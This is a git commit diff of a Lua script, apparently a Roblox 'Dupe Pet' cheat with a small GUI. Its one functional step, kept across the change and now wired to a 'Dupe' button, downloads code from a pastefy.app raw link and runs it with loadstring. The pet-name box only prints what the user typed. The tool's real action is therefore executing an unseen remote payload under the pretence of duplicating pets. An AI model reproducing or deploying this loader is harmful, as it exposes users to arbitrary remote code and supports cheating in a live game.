adf315352b9f8447eb7c36b30cb4dbe4caaef111
exclusiv1337 <exclusiv1392@gmail.com>
2025-05-24 18:45:33 +0200

    Update dupe.lua

--- dupe.lua
+++ dupe.lua
@@ -4,16 +4,17 @@ local Window = Library.CreateLib("Dupe Pet by Mangekoy2 | v2.0", "Serpent")
 -- Вкладка 1: Dupe Pet
 local Tab1 = Window:NewTab("Dupe Pet")
 local Section1 = Tab1:NewSection("DUPE PET")
-
--- Один комбинированный элемент: и ввод, и действие
-Section1:NewTextBox("DUPE", "Write any pet and press Enter", function(txt)
-    if txt ~= "" then
-        loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
-    else
-        warn("You must enter a pet name!")
-    end
+Section1:NewTextBox("Pet Name", "Write any pet", function(txt)
+    -- Ваш код для обработки текста, например:
+    print("You entered pet name: " .. txt)
 end)
 
--- Вкладка 2: Credits
+
+-- Кнопка Dupe
+Section1:NewButton("Dupe", "", function()
+    loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
+end)
+
+-- Вкладка 2: Credits (точно как вы просили)
 local Tab2 = Window:NewTab("Credits")
 local Section2 = Tab2:NewSection("Made by Mangekoy2 | v2.0")
